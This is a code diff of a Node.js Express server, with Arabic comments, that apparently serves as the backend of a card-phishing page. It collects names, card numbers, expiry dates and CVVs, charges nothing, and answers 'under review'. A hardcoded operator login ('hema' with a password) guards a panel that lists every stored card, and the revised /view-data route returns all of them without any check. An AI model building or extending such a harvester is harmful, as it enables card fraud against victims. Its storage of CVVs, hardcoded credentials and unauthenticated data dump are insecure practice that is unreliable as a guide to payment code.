@@ -1,68 +1,55 @@
 const express = require('express');
-const sqlite3 = require('sqlite3').verbose();
 const bodyParser = require('body-parser');
-const cors = require('cors');
+const sqlite3 = require('sqlite3').verbose();
 const path = require('path');
 
 const app = express();
-const port = 3000;
+const PORT = process.env.PORT || 3000;
 
-// إعداد قاعدة البيانات
-const db = new sqlite3.Database(':memory:');
-
-// إنشاء جدول لتخزين بيانات الدفع
-db.serialize(() => {
-    db.run("CREATE TABLE payments (name TEXT, card_number TEXT, expiry_date TEXT, cvv TEXT, country TEXT, amount REAL, currency TEXT)");
-});
-
-// إنشاء جدول للمستخدمين
-db.serialize(() => {
-    db.run("CREATE TABLE users (user_id TEXT, password TEXT)");
-    // إضافة مستخدم اختباري
-    const stmt = db.prepare("INSERT INTO users VALUES (?, ?)");
-    stmt.run("hema", "aa.1122334455.aa");  // استبدل user_id و password بالقيم الجديدة
-    stmt.finalize();
-});
-
-app.use(cors());
+// Middleware
 app.use(bodyParser.json());
-app.use(bodyParser.urlencoded({ extended: true }));
-
-// تقديم ملفات ثابتة من مجلد 'public'
 app.use(express.static(path.join(__dirname, 'public')));
 
-// استقبال البيانات وإدخالها في قاعدة البيانات
-app.post('/submit', (req, res) => {
+const db = new sqlite3.Database(':memory:');
+
+db.serialize(() => {
+    db.run("CREATE TABLE IF NOT EXISTS payments (name TEXT, card_number TEXT, expiry_date TEXT, cvv TEXT, country TEXT, amount TEXT, currency TEXT)");
+});
+
+// Serve the index.html file
+app.get('/view-data-page', (req, res) => {
+    res.sendFile(path.join(__dirname, 'public', 'view-data.html'));
+});
+
+
+app.post('/submit-payment', (req, res) => {
     const { name, card_number, expiry_date, cvv, country, amount, currency } = req.body;
     const stmt = db.prepare("INSERT INTO payments VALUES (?, ?, ?, ?, ?, ?, ?)");
     stmt.run(name, card_number, expiry_date, cvv, country, amount, currency);
     stmt.finalize();
-    res.send('قيد المراجعة الطلب');
+
+    res.json({ success: true });
 });
 
-// عرض البيانات بعد التحقق من المستخدم وكلمة المرور
-app.post('/view-data', (req, res) => {
-    const { userId, password } = req.body;
+app.post('/login', (req, res) => {
+    const { username, password } = req.body;
+    if (username === 'hema' && password === 'aa.1122334455.aa') {
+        res.json({ success: true });
+    } else {
+        res.json({ success: false });
+    }
+});
 
-    db.get("SELECT * FROM users WHERE user_id = ? AND password = ?", [userId, password], (err, row) => {
+app.get('/view-data', (req, res) => {
+    db.all("SELECT * FROM payments", (err, rows) => {
         if (err) {
-            console.error(err.message);
-            res.status(500).send('خطأ في الخادم');
-        } else if (row) {
-            db.all("SELECT * FROM payments", [], (err, rows) => {
-                if (err) {
-                    console.error(err.message);
-                    res.status(500).send('خطأ في الخادم');
-                } else {
-                    res.json(rows);
-                }
-            });
+            res.json({ success: false, message: 'Failed to retrieve data' });
         } else {
-            res.status(401).send('رقم المستخدم أو كلمة المرور غير صحيحة');
+            res.json({ success: true, data: rows });
         }
     });
 });
 
-app.listen(port, () => {
-    console.log(`Server running at http://localhost:${port}`);
+app.listen(PORT, () => {
+    console.log(`Server running on port ${PORT}`);
 });
